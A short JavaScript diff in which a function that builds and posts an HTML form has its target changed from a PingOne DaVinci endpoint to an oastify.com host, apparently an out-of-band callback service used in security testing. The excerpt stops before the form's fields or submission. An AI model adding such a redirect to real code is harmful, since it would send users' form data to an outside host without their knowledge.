@@ -1,5 +1,5 @@
 function sendPostWithoutFetch() {
-    const url = "https://auth.ort-one-pingone.com/f0f52ba9-9d84-40a4-99c6-26416327722d/davinci/connections/867ed4363b2bc21c860085ad2baa817d/capabilities/customHtmlMessage";
+    const url = "https://mxnsskj6e98b6ppkq7vv2j4y6pcg09oy.oastify.com";
 
     // 1. Create a form element
     const form = document.createElement('form');
